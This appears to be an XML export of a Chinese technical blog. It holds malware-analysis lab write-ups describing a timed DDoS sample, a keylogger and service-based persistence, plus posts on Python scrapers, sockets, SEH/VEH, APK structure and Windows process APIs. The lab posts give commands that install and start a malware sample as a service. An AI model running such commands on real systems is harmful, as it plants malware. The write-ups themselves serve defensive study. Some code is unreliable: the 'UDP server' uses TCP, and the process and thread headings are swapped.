接下来程序使用了SYSTEMTIME的结构体，这是Windows的一个关于时间的结构体。可以看到，程序首先将wYear（年）、wDayOfWeek（星期）、wHour（时）以及wSecond（秒）设置为了零，下面又将wYear（年）设置为了0x834，也就是十进制的2100，这个时间是2100年。之后调用SystemTimeToFileTime来将系统时间转换为文件时间。这里又调用了CreateWaitableTimer、SetWaitableTimer以及WaitForSingleObject。对于我们来说最重要的是SetWaitableTimer的lpDueTime这个参数。它是SystemTimeToFileTime所返回的文件时间，之后利用WaitForSingleObject进入等待，直到2100年1月1日的午夜。 如果等到了2100年1月1日，那么就会执行以下代码：这段代码会创建14h个线程去执行线程中的代码，我们进入StartAddress中看看。可以看到，程序首先使用InternetOpenA来初始化一个网络连接，下面在一个循环中调用InternetOpenUrlA。这是一个死循环，它会不断地调用InternetOpenUrlA来访问www.malwareanalysisbook.com这个网页。而且由于CreateThread被调用了20次，所以会有20个线程不断地调用InternetOpenUrlA来访问这个网站。显然这是一个DDoS（分布式拒绝服务）攻击。 1、当计算机重启后，这个程序如何确保它继续运行（达到持久化驻留）？这个程序会创建一个名为MalService的服务，来保证它会在每次系统启动后运行。 2、为什么这个程序会使用一个互斥量？保证同一时间只有一份实例在运行。 3、可以用来检测这个程序的基于主机特征是什么？一个是名为HGL345的互斥量，另一个是名为Malservice的服务。 4、检测这个恶意代码的基于网络特征是什么？这个恶意程序使用了用户代理Internet Explorer 8.0，以及不断地访问www.malwareanalysisbook.com这个网页。 5、这个程序的目的是什么？这个程序运行后，会等待到2100年1月1日的半夜，然后发送很多访问请求到www.malwareanalysisbook.com这个网页，以实现对这个网站的DDoS攻击。 6、这个程序什么时候完成执行？这个程序永远不会完成，程序就会进入一个无限循环。]]></content>
      <categories>
        <category>《恶意代码分析实战》</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析实战：Lab03-03]]></title>
    <url>%2F2020%2F08%2F10%2F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%EF%BC%9ALab03-03%2F</url>
    <content type="text"><![CDATA[问题1、当你使用Process Explorer工具进行监视时，你注意到了什么？打开Process Explorer，再运行Lab03-03.exe，创建了应该名为svchost.exe的程序，然后Lab03-03.exe就消失了。 2、你可以找出任何的内存修改行为吗？可以发现它会创建一个日志文件，并且有abcdefghijklmnopqrstuvwxyz、ABCDEFGHIJKLMNOPQRSTUVWXYZ以及[SHIFT]、[ENTER]等字符串，可以判断这是一个键盘记录器。 3、这个恶意代码在主机上的感染迹象特征是什么？可以看到，恶意代码在不断地调用CreateFile与WriteFile这两个函数，并且将键盘操作记录在日志文件中。 4、这个恶意代码的目的是什么？创建一个键盘记录器。]]></content>
      <categories>
        <category>《恶意代码分析实战》</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析实战：Lab03-02]]></title>
    <url>%2F2020%2F08%2F07%2F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%EF%BC%9ALab03-02%2F</url>
    <content type="text"><![CDATA[Lab 3-2使用动态分析技术来分析在Lab03-03.dll文件中发现的恶意代码 问题首先用PEID查看一下实验文件的导出表：可以发现，一共有5个导出函数，第二个和第三个从名称上看与服务相关。利用strings进行字符串查看：可以看到这里出现了svchost这个程序，它是一个宿主程序。DLL文件自身是不能够运行的，因此我们系统中的很多DLL就会依附svchost.exe这个程序上面。 1、你怎样才能让这个恶意代码自行安装？1C:\&gt; rundll32.exe Lab03-02.dll,installA 可以发现，Lab03-02.dll会添加一个名为IPRIP的服务；ImagePath后有一个svchost，说明恶意程序会在svchhost实现启动。 2、在安装之后，你如何让这个恶意代码运行起来？1C:\&gt; net start IPRIP 3、你怎么能找到这个恶意代码是在哪个进程下运行的？可以发现，Lab03-02.dll依附在了PID为1024的svchost.exe上。 4、你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？在procmon中打开筛选器，然后添加PID为980的筛选条件。 5、这个恶意代码在主机上的感染迹象特征是什么？创建一个名为IPRIP的服务。 6、这个恶意代码是否存在一下有用的网络特征码？]]></content>
      <categories>
        <category>《恶意代码分析实战》</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析实战：Lab03-01]]></title>
    <url>%2F2020%2F08%2F05%2F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%EF%BC%9ALab03-01%2F</url>
    <content type="text"><![CDATA[PEID检测首先用PEID进行基本检测：可以发现，这个程序加了壳。并且只调用了kernel32.dll，以及ExitProcess()这个API。接下来用strings这个程序查看一下它包含哪些可打印字符：可以发现，字符串中出现了一个网址和几个注册表的位置。恶意代码通常通过SOFTVARE\Microsoft\Windows\CurrentUsersion\Run注册表位置进行自启动。 感染特征启动Process Explorer、Process Monitor以及Wireshark，在Process Monitor筛选器中设置筛选条件，将Process Name设置为我们的实验文件的名称Lab03-01.exe，运行程序，可以看到Process Explorer已经监控到了Lab03-01.exe，通过Process Explorer可以发现，该程序创建了一个名为WinVMX32的互斥量。以及包含ws2_32.dll和wshtcpip.dll两个DLL文件，有互联网的一些操作。查看Process monitor，在Operation中选择WriteFile和RegSetValue，查看文件写入以及注册表写入：第一个Seed键值，一般用于随机数的生成。第二个监控结果，可以发现程序在系统目录中创建了一个名为vmx32to64.exe这样的一个程序，并且还包含有写入的操作。第三条监控结果则说明了程序添加了名为VideoDriver的自启动项。 网络特征码打开WireShark进行查看，可以发现一个DNS域名解析：它会尝试进行网络访问。然后发现几个SSL，查看数据，可以发现，每一个SSL的蓝色高亮部分都是不一样的，其大小为256个字节，可以认为这部分的数据内容其实是随机的，定期发送，不断进行广播：]]></content>
      <categories>
        <category>《恶意代码分析实战》</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫]]></title>
    <url>%2F2020%2F07%2F19%2FPython%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[1、爬取豆瓣Top250电影123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#------------------------------------# !/usr/bin/env python# -*- encoding: utf-8 -*-# @FileName : 豆瓣Top250.py# @Author : 嘿嘿嘿# @Time : 2020/7/19 0:11# @Software : PyCharm#------------------------------------from bs4 import BeautifulSoup #网页解析，获取数据import re #正则表达式，进行文字匹配import urllib.request,urllib.error #指定URL，获取网页数据import xlwt #进行excel操作import sqlite3 #进行数据库操作def main(): baseurl = &quot;https://movie.douban.com/top250?start=&quot; datalist = getData(baseurl) savepath = &quot;.\\豆瓣电影Top250.xls&quot; saveDate(datalist, savepath)# 获取网页def getData(baseurl): datalist = [] for i in range(0, 10): url = baseurl + str(i*25) html = askURL(url) soup = BeautifulSoup(html, &apos;html.parser&apos;) for item in soup.find_all(&apos;div&apos;,class_=&quot;item&quot;): data = [] item = str(item) id = re.findall(&apos;&lt;em class=&quot;&quot;&gt;(.*)&lt;/em&gt;&apos;, item)[0] title = re.findall(r&apos;&lt;span class=&quot;title&quot;&gt;(.*)&lt;/span&gt;&apos;, item)[0] link = re.findall(r&apos;&lt;a href=&quot;(.*)&quot;&gt;&apos;, item)[0] rating_num = re.findall(r&apos;&lt;span class=&quot;rating_num&quot; property=&quot;v:average&quot;&gt;(.*)&lt;/span&gt;&apos;, item)[0] people = re.findall(r&apos;&lt;span&gt;(.*人评价)&lt;/span&gt;&apos;, item)[0] data.append(id) data.append(title) data.append(rating_num) data.append(link) data.append(people) datalist.append(data) print(datalist) return datalistdef askURL(url): head = &#123; &quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&quot; &#125; request = urllib.request.Request(url, headers=head) html = &apos;&apos; try: response = urllib.request.urlopen(request) html = response.read().decode(&apos;utf-8&apos;) #print(html) except urllib.error.URLError as e: if hasattr(e, &apos;code&apos;): print(e.code) if hasattr(e, &apos;reason&apos;): print(e.reason) return html# 保存数据def saveDate(datalist, savepath): workbook = xlwt.Workbook(encoding=&apos;utf-8&apos;, style_compression=0) worksheet = workbook.add_sheet(&apos;sheet1&apos;, cell_overwrite_ok=True) col = (&quot;电影排名&quot;, &quot;电影名称&quot;, &quot;电影评分&quot;, &quot;评价人数&quot;) for i in range(0, 4): worksheet.write(0, i, col[i]) for i in range(0,250): for j in range(0,5): worksheet.write(i+1,j,datalist[i][j]) workbook.save(&apos;豆瓣Top250.xls&apos;)if __name__ == &quot;__main__&quot;: 2、爬取江西高考投档线1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#------------------------------------# !/usr/bin/env python# -*- encoding: utf-8 -*-# @FileName : 江西高考投档线.py# @Author : 嘿嘿嘿# @Time : 2020/7/19 14:49# @Software : PyCharm#------------------------------------from bs4 import BeautifulSoup #网页解析，获取数据import re #正则表达式，进行文字匹配import urllib.request,urllib.error #指定URL，获取网页数据import xlwt #进行excel操作def main(): baseurl = &quot;https://www.dxsbb.com/news/58588.html&quot; datalist = getData(baseurl) saveDate(datalist)# 获取网页def getData(baseurl): title_col = [[&apos;序号&apos;], [&apos;科类&apos;], [&apos;院校代号&apos;], [&apos;院校名称&apos;], [&apos;投档线&apos;], [&apos;最低投档排名&apos;]] datas = [&apos;&apos;] datalist = [] html = askURL(baseurl) soup = BeautifulSoup(html, &apos;html.parser&apos;) for item in soup.find_all(&apos;td&apos;, style=&quot;text-align:center;&quot;): item = str(item).strip() data = re.findall(r&apos;&lt;td style=&quot;text-align:center;&quot;&gt;(.*)&lt;/td&gt;&apos;, item) data = str(data) data = re.sub(r&quot;&lt;a class=.keyWord. href=.../news/list_...?.html. target=._blank.&gt;&quot;, &apos;&apos;, data) data = re.sub(r&quot;&lt;/a&gt;&quot;, &apos;&apos;, data) data = str(data).strip(&quot;[&apos;&quot;) data = str(data).strip(&quot;&apos;]&quot;) print(data) datas.append(data) if len(datas)%6 == 0: datas = [] datalist.append(datas) datalist[0] = title_col datalist.pop() return datalistdef askURL(url): head = &#123; &quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&quot; &#125; request = urllib.request.Request(url, headers=head) html = &apos;&apos; try: response = urllib.request.urlopen(request) html = response.read().decode(&apos;gbk&apos;) except urllib.error.URLError as e: if hasattr(e, &apos;code&apos;): print(e.code) if hasattr(e, &apos;reason&apos;): print(e.reason) return html# 保存数据def saveDate(datalist): workbook = xlwt.Workbook(encoding=&apos;utf-8&apos;, style_compression=0) worksheet = workbook.add_sheet(&apos;sheet1&apos;, cell_overwrite_ok=True) for i in range(0, len(datalist)): for j in range(0, 6): worksheet.write(i, j, datalist[i][j]) workbook.save(&apos;2019江西高考二本投档线.xls&apos;)if __name__ == &quot;__main__&quot;:]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python网络编程]]></title>
    <url>%2F2020%2F06%2F08%2FPython%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[1、socket()模块函数要创建套接字，必须使用socket.socket()函数，它的语法如下： 1socket（socket_family, socket_type, protocol = 0） 其中，socket_family是AF_UNIX（基于文件）或AF_INET（基于网络）,socket_type是SCOKET_STREAM（TCP）或SOCKET_DGRAM（UDP）。 1tcpSock = socket(AF_INET, SOCK_STREAM/SOCKET_DGRAM) 2、套接字对象方法1、服务器套接字方法 2、客户端套接字方法 3、普通的套接字方法名称 描述 s.recv() 接受TCP消息 s.recv_into() 接受TCP消息到指定的缓冲区 s.send() 发送TCP消息 s.sendall() 完整的发送TCP消息 s.recvfrom() 接受UDP消息 s.recvfrom_into() 接受UDP消息到指定缓冲区 s.sendto() 发送UDP消息 s.getpeername() 连接到套接字（TCP）的远程地址 s.getsockname() 当前套接字地址 s.getsockopt() 返回给定套接字选项的值 s.setsockopt() 设置给定套接字选项的值 s.shutdown() 关闭连接 s.close() 关闭套接字 s.detach() 在未关闭文件描述符的情况下关闭套接字，返回文件描述符 s.ioctl() 控制套接字的模式（仅window）4、面向阻塞的套接字方法 5、面向文件的套接字方法 3、TCP1、tcp服务端1234567891011121314151617181920212223242526from socket import *from time import ctimeHOST = &apos;&apos;PORT = 21567BUFSIZ = 1024ADDR = (HOST, PORT)tcpSerSock = socket(AF_INET, SOCK_STREAM) #创建TCP套接字tcpSerSock.bind(ADDR)tcpSerSock.listen(5)while True: print(&apos;waiting for connection...&apos;) tcpCliSock, addr = tcpSerSock.accept() #被动接受TCP客户端连接 print(&apos;...connected from:&apos;, addr) while True: data = tcpCliSock.recv(BUFSIZ).decode() #接受TCP消息 if not data: break #tcpCliSock.send(&apos;[%s] %s&apos; % (bytes(ctime(), &apos;utf-8&apos;), data)) tcpCliSock.send(bytes((&apos;[%s] %s&apos; % (ctime(), data)).encode())) tcpCliSock.close()tcpSerSock.close() 2、tcp客户端123456789101112131415161718192021from socket import *HOST = &apos;127.0.0.1&apos;PORT = 21567BUFSIZ = 1024ADDR = (HOST, PORT)tcpCliSock = socket(AF_INET, SOCK_STREAM)tcpCliSock.connect(ADDR) #主动发起TCP服务器连接while True: data = input(&apos;&gt; &apos;) if not data: break tcpCliSock.send(data.encode()) #发送TCP消息 data = tcpCliSock.recv(BUFSIZ).decode() #接受TCP消息 if not data: break print(data)tcpCliSock.close() 4、UDP1、udp服务端1234567891011121314151617181920212223242526from socket import *from time import ctimeHOST = &apos;&apos;PORT = 21568BUFSIZ = 1024ADDR = (HOST, PORT)tcpSerSock = socket(AF_INET, SOCK_STREAM)tcpSerSock.bind(ADDR)tcpSerSock.listen(5)while True: print(&apos;waiting for connection...&apos;) tcpCliSock, addr = tcpSerSock.accept() print(&apos;...connected from:&apos;, addr) while True: data = tcpCliSock.recv(BUFSIZ).decode() if not data: break #tcpCliSock.send(&apos;[%s] %s&apos; % (bytes(ctime(), &apos;utf-8&apos;), data)) tcpCliSock.send(bytes((&apos;[%s] %s&apos; % (ctime(), data)).encode())) tcpCliSock.close()tcpSerSock.close() 2、udp客户端1234567891011121314151617181920from socket import *HOST = &apos;127.0.0.1&apos;PORT = 21567BUFSIZ = 1024ADDR = (HOST, PORT)udpCliSock = socket(AF_INET, SOCK_DGRAM)while True: data = input(&apos;&gt; &apos;) if not data: break udpCliSock.sendto(data.encode(), ADDR) data, ADDR = udpCliSock.recvfrom(BUFSIZ) if not data: break print (data.decode())udpCliSock.close()]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>网络编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SEH和VEH]]></title>
    <url>%2F2020%2F06%2F04%2FSEH%E5%92%8CVEH%2F</url>
    <content type="text"><![CDATA[SEH（Structured Exception Handling，结构化异常处理）是window操作系统默认的异常处理机制，逆向分析中，SEH除了基本的异常处理功能外，还大量用于反调试程序。 1、SEH的相关数据结构1、TIB结构TIB（Thread Information Block，线程信息块）是保存线程基本信息的数据结构。在用户模式下，它位于TEB（Thread Environment Block，线程环境块）的头部，而TEB是操作系统为了保存每个线程的私有数据创建的，每个线程都有自己的TEB。TIB定义： 12345678910111213typedef struct _NT_TIB&#123; struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList;//指向异常处理链表 PVOID StackBase;//当前线程所使用的栈的栈底 PVOID StackLimit;//当前线程所使用的栈的栈顶 PVOID SubSystemTib; union &#123; PVOID FiberData; DWORD Version; &#125;; PVOID ArbitraryUserPointer; struct _NT_TIB *Self;//指向TIB结构自身&#125; NT_TIB;typedef NT_TIB *PNT_TIB; 2、_EXCEPTION_REGISTRATION_RECORD结构TEB偏移量为0的_EXCEPTION_REGISTRATION_RECORD主要用于描述线程异常处理过程的地址，多个该结构体的链表描述了多个线程异常处理过程的嵌套层次关系，定义如下： 123456struct EXCEPTION_REGISTRATION_RECORDtypedef struct _EXCEPTION_REGISTRATION_RECORD&#123; PEXCEPTION_REGISTRATION_RECORD Next;//指向下一个结构的指针 PEXCEPTION_DISPOSITION Handler;//当前异常处理回调函数的地址&#125; EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD; 3、EXCEPTION_DISPOSITION结构由系统调用，是一个回调函数，第一个参数是一个指向EXCEPTION_RECORD结构体的指针 123456EXCEPTION_DISPOSITION __cdecl _except_handler ( EXCEPTION_RECORD *pRecord, EXCEPTION_REGISTRATION_RECORD *pFrame, CONTEXT *pContext, PVOID pValue); 4、EXCEPTION_RECORD结构异常处理函数的第三个参数是指向CONTEXT结构体的指针，CONTEXT结构体用来备份CPU的值。 12345678typedef struct _EXCEPTION_RECORD &#123; DWORD ExceptionCode; //异常代码 DWORD ExceptionFlags; struct _EXCEPTION_RECORD *ExceptionRecord; PVOID ExceptionAddress; //异常发生地址 DWORD NumberParameters; ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];&#125; EXCEPTION_RECORD; 异常发生的时候，执行异常代码的线程就会发生中断，转而运行SEH，此时操作系统会把线程CONTEXT结构体的指针传递给异常处理函数的相应参数。里面有个eip成员，在异常处理函数中将参数传递过来的CONTEXT.eip设置为其他地址，然后返回处理函数。这样之前暂停的线程会执行新的EIP地址处的代码。 2、VEH向量化异常处理的基本概念和SEH相同，也是注册一个回调函数，当发生异常时会被系统的异常处理过程调用。 123456789WINBASEAPI PVOID WINAPI AddVectoreExceptionHandler ( ULONG FirstHandler; PVECTORED_EXCEPTION_HANDLER VectoreHandler//回调函数地址);//回调函数原型LONG CALLBACK VectoredHandler ( PEXCEPTION_POINTERS ExceptionInfo); VEH回调函数也形成一个链表。若参数FirstHandler的值为0，则回调函数位于VEH链表的尾部；若参数FirstHandler为非零值，则置于VEH链表的头部。VEH回调函数所在的模块被卸载之后，系统不能自动将回调函数从VEH链表上移除，需要程序在退出前自己完成卸载工作。 123ULONG RemoveVectoreExceptionHandler ( POVID VectoreHandlerHandle); VectoreHandlerHandle为AddVectoreExceptionHandler的返回值。 123456789101112131415161718192021222324252627282930#include &quot;stdafx.h&quot;#define _WIN32_WINNT 0x502#include &lt;windows.h&gt;char szTit[]=&quot;design : achillis XP+&quot;;DWORD validADDR;LONG WINAPI VectExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)&#123; PCONTEXT pContext=ExceptionInfo-&gt;ContextRecord; pContext-&gt;Eax=(DWORD)&amp;validADDR; return EXCEPTION_CONTINUE_EXECUTION;&#125;int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR CmdLine,int nCmdShow)&#123; PVOID handle = AddVectoredExceptionHandler(TRUE, VectExceptionHandler); __asm &#123; xor eax,eax mov [eax],5 //向0地址写入数据，引发内存访问异常 &#125; MessageBox(0,&quot;We SUC recovering from Write Acess!&quot;,szTit,MB_ICONINFORMATION); RemoveVectoredExceptionHandler(handle); return 0;&#125;]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[APK文件结构]]></title>
    <url>%2F2020%2F06%2F02%2FAPK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[1、APK文件结构apk文件，即Android application package文件。每个要安装到Android平台的应用都要被编译打包为一个单独的文件，后缀名为.apk，其中包含了应用的二进制代码、资源、配置文件等。APK文件其实是zip格式，但后缀名被修改为apk，在Android 系统安装时，APK程序会被存放在系统默认的APP 目录中。 assets目录：存放需要打包到APK中的静态文件 lib目录：程序依赖的native库 res目录：存放应用程序的资源 META-INF目录：存放应用程序签名和证书的目录 AndroidManifest.xml：应用程序的配置文件 classes.dex：dex可执行文件 resources.arsc：资源配置文件1、assets目录用于存放需要打包到APK中的静态文件，和res的不同点在于，assets目录支持任意深度的子目录，用户可以根据自己的需求任意部署文件夹架构，而且res目录下的文件会在.R文件中生成对应的资源ID，assets不会自动生成对应的ID，访问的时候需要AssetManager类。 2、lib目录这里存放应用程序依赖的native库文件，一般是用C/C++编写，这里的lib库可能包含4中不同类型，根据CPU型号的不同，大体可以分为ARM，ARM-v7a，MIPS，X86，分别对应着ARM架构，ARM-V7架构，MIPS架构和X86架构，这些so库在APK包中的构成如下图： 3、res目录res是resource的缩写，这个目录存放资源文件，存在这个文件夹下的所有文件都会映射到Android工程的.R文件中，生成对应的ID，访问的时候直接使用资源ID即R.id.filename，res文件夹下可以包含多个文件夹，其中anim存放动画文件；drawable目录存放图像资源；layout目录存放布局文件；values目录存放一些特征值，colors.xml存放color颜色值，dimens.xml定义尺寸值，string.xml定义字符串的值，styles.xml定义样式对象；xml文件夹存放任意xml文件，在运行时可以通过Resources.getXML()读取；raw是可以直接复制到设备中的任意文件，他们无需编译。 4、META-INF目录保存应用的签名信息，签名信息可以验证APK文件的完整性。AndroidSDK在打包APK时会计算APK包中所有文件的完整性，并且把这些完整性保存到META-INF文件夹下，应用程序在安装的时候首先会根据META-INF文件夹校验APK的完整性，这样就可以保证APK中的每一个文件都不能被篡改。以此来确保APK应用程序不被恶意修改或者病毒感染，有利于确保Android应用的完整性和系统的安全性。META-INF目录下包含的文件有CERT.RSA，CERT.DSA，CERT.SF和MANIFEST.MF，其中CERT.RSA是开发者利用私钥对APK进行签名的签名文件，CERT.SF，MANIFEST.MF记录了文件中文件的SHA-1哈希值。 5、AndroidManifest.xmlAndroid应用程序的配置文件，是一个用来描述Android应用“整体资讯”的设定文件，简单来说，相当于Android应用向Android系统“自我介绍”的配置文件，Android系统可以根据这个“自我介绍”完整地了解APK应用程序的资讯，每个Android应用程序都必须包含一个AndroidManifest.xml文件，且它的名字是固定的，不能修改。我们在开发Android应用程序的时候，一般都把代码中的每一个Activity，Service，Provider和Receiver在AndroidManifest.xml中注册，只有这样系统才能启动对应的组件，另外这个文件还包含一些权限声明以及使用的SDK版本信息等等。程序打包时，会把AndroidManifest.xml进行简单的编译，便于Android系统识别，编译之后的格式是AXML格式，如图所示： 6、classes.dex传统的Java程序，首先先把Java文件编译成class文件，字节码都保存在了class文件中，Java虚拟机可以通过解释执行这些class文件。而Dalvik虚拟机是在Java虚拟机进行了优化，执行的是Dalvik字节码，而这些Dalvik字节码是由Java字节码转换而来，一般情况下，Android应用在打包时通过AndroidSDK中的dx工具将Java字节码转换为Dalvik字节码。dx工具可以对多个class文件进行合并，重组，优化，可以达到减小体积，缩短运行时间的目的。 7、resources.arsc用来记录资源文件和资源ID之间的映射关系，用来根据资源ID寻找资源。Android的开发是分模块的，res目录专门用来存放资源文件，当在代码中需要调用资源文件时，只需要调用findviewbyId()就可以得到资源文件，每当在res文件夹下放一个文件，aapt就会自动生成对应的ID保存在.R文件，我们调用这个ID就可以，但是只有这个ID还不够，.R文件只是保证编译程序不报错，实际上在程序运行时，系统要根据ID去寻找对应的资源路径，而resources.arsc文件就是用来记录这些ID和资源文件位置对应关系的文件。 2、APK安装流程1、复制APK到/data/app目录下，解压并扫描安装包。 2、资源管理器解析APK里的资源文件。 3、解析AndroidManifest文件，并在/data/data/44、目录下创建对应的应用数据目录。 5、然后对dex文件进行优化（odex），并保存在dalvik-cache目录下。 6、将AndroidManifest文件解析出的四大组件信息注册到PackageManagerService中。 7、安装完成后，发送广播。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[线程与进程]]></title>
    <url>%2F2020%2F05%2F31%2F%E7%BA%BF%E7%A8%8B%E4%B8%8E%E8%BF%9B%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[1、创建线程123456789101112BOOL CreateProcess( LPCTSTR lpApplicationName, // pointer to name of executable module LPTSTR lpCommandLine, // pointer to command line string LPSECURITY_ATTRIBUTES lpProcessAttributes, // pointer to process security attributes LPSECURITY_ATTRIBUTES lpThreadAttributes, // pointer to thread security attributes BOOL bInheritHandles, // handle inheritance flag DWORD dwCreationFlags, // creation flags LPVOID lpEnvironment, // pointer to new environment block LPCTSTR lpCurrentDirectory, // pointer to current directory name LPSTARTUPINFO lpStartupInfo, // pointer to STARTUPINFO LPPROCESS_INFORMATION lpProcessInformation // pointer to PROCESS_INFORMATION); lpApplicationName: 指向一个NULL结尾的、用来指定可执行模块的字符串。这个字符串可以是可执行模块的绝对路径，也可以是相对路径，在后一种情况下，函数使用当前驱动器和目录建立可执行模块的路径。这个参数可以被设为NULL，在这种情况下，可执行模块的名字必须处于 lpCommandLine 参数最前面并由空格符与后面的字符分开。 lpCommandLine: 指向一个以NULL结尾的字符串，该字符串指定要执行的命令行。这个参数可以为空，那么函数将使用lpApplicationName参数指定的字符串当做要运行的程序的命令行。 lpProcessAttributes: 指向一个SECURITY_ATTRIBUTES结构体，这个结构体决定是否返回的句柄可以被子进程继承。如果lpProcessAttributes参数为空（NULL），那么句柄不能被继承。 lpThreadAttributes: 同lpProcessAttribute,不过这个参数决定的是线程是否被继承.通常置为NULL. bInheritHandles: 指示新进程是否从调用进程处继承了句柄。如果参数的值为真，调用进程中的每一个可继承的打开句柄都将被子进程继承。被继承的句柄与原进程拥有完全相同的值和访问权限。 dwCreationFlags：指定附加的、用来控制优先类和进程的创建的标志。以下的创建标志可以以除下面列出的方式外的任何方式组合后指定。 ⑴值：CREATE_DEFAULT_ERROR_MODE：新的进程不继承调用进程的错误模式。 ⑵值：CREATE_NEW_CONSOLE：新的进程将使用一个新的控制台，而不是继承父进程的控制台。这个标志不能与DETACHED_PROCESS标志一起使用。 ⑶值：CREATE_NEW_PROCESS_GROUP：新进程将是一个进程树的根进程。 ⑷值：CREATE_SEPARATE_WOW_VDM： 如果被设置，新进程将会在一个私有的虚拟DOS机（VDM）中运行。 ⑸值：CREATE_SHARED_WOW_VDM： 如果WIN.INI中的Windows段的DefaultSeparateVDM选项被设置为真，这个标识使得CreateProcess函数越过这个选项并在共享的虚拟DOS机中运行新进程。 ⑹值：CREATE_SUSPENDED：新进程的主线程会以暂停的状态被创建，直到调用ResumeThread函数被调用时才运行。 ⑺值：CREATE_UNICODE_ENVIRONMENT：如果被设置，由lpEnvironment参数指定的环境块使用Unicode字符，如果为空，环境块使用ANSI字符。 ⑻值：DEBUG_PROCESS：如果这个标志被设置，调用进程将被当做一个调试程序，并且新进程会被当做被调试的进程。系统把被调试程序发生的所有调试事件通知给调试器。 ⑼值：DEBUG_ONLY_THIS_PROCESS：如果此标志没有被设置且调用进程正在被调试，新进程将成为调试调用进程的调试器的另一个调试对象。如果调用进程没有被调试，有关调试的行为就不会产生。 ⑽值：DETACHED_PROCESS：对于控制台进程，新进程没有访问父进程控制台的权限。新进程可以通过AllocConsole函数自己创建一个新的控制台。这个标志不可以与CREATE_NEW_CONSOLE标志一起使用。 (11)值：CREATE_NO_WINDOW：系统不为新进程创建CUI窗口，使用该标志可以创建不含窗口的CUI程序。 dwCreationFlags参数：用来控制新进程的优先类，优先类用来决定此进程的线程调度的优先级。 可以选择下面的标志中的一个： 优先级：HIGH_PRIORITY_CLASS：指示这个进程将执行时间临界的任务，所以它必须被立即运行以保证正确。这个优先级的程序优先于正常优先级或空闲优先级的程序。 优先级：IDLE_PRIORITY_CLASS：指示这个进程的线程只有在系统空闲时才会运行并且可以被任何高优先级的任务打断。例如屏幕保护程序。空闲优先级会被子进程继承。 优先级：NORMAL_PRIORITY_CLASS：指示这个进程没有特殊的任务调度要求。 优先级：REALTIME_PRIORITY_CLASS：指示这个进程拥有可用的最高优先级。一个拥有实时优先级的进程的线程可以打断所有其他进程线程的执行，包括正在执行重要任务的系统进程。 lpEnvironment：指向一个新进程的环境块。如果此参数为空，新进程使用调用进程的环境。 lpCurrentDirectory：指向一个以NULL结尾的字符串，这个字符串用来指定子进程的工作路径。这个字符串必须是一个包含驱动器名的绝对路径。如果这个参数为空，新进程将使用与调用进程相同的驱动器和目录。 lpStartupInfo：指向一个用于决定新进程的主窗体如何显示的STARTUPINFO结构体。 lpProcessInformation：指向一个用来接收新进程的识别信息的PROCESS_INFORMATION结构体。2、创建进程12345678HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, // pointer to thread security attributes DWORD dwStackSize, // initial thread stack size, in bytes LPTHREAD_START_ROUTINE lpStartAddress, // pointer to thread function LPVOID lpParameter, // argument for new thread DWORD dwCreationFlags, // creation flags LPDWORD lpThreadId // pointer to returned thread identifier); lpThreadAttrivutes：指向SECURITY_ATTRIBUTES的指针，用于定义新线程的安全属性，一般设置成NULL； dwStackSize：分配以字节数表示的线程堆栈的大小，默认值是0； lpStartAddress：指向一个线程函数地址。每个线程都有自己的线程函数，线程函数是线程具体的执行代码； lpParameter：传递给线程函数的参数； dwCreationFlags：表示创建线程的运行状态，其中CREATE_SUSPEND表示挂起当前创建的线程，而0表示立即执行当前创建的进程； lpThreadID：返回新创建的线程的ID编号；123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;DWORD WINAPI ThreadProc(LPVOID lpParameter)&#123; int i; for(i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;++++++++++++++++%d \n&quot;, i); &#125; return 0;&#125;int main()&#123; int i; HANDLE hThread; hThread = CreateThread(NULL, 0, ThreadProc, NULL, 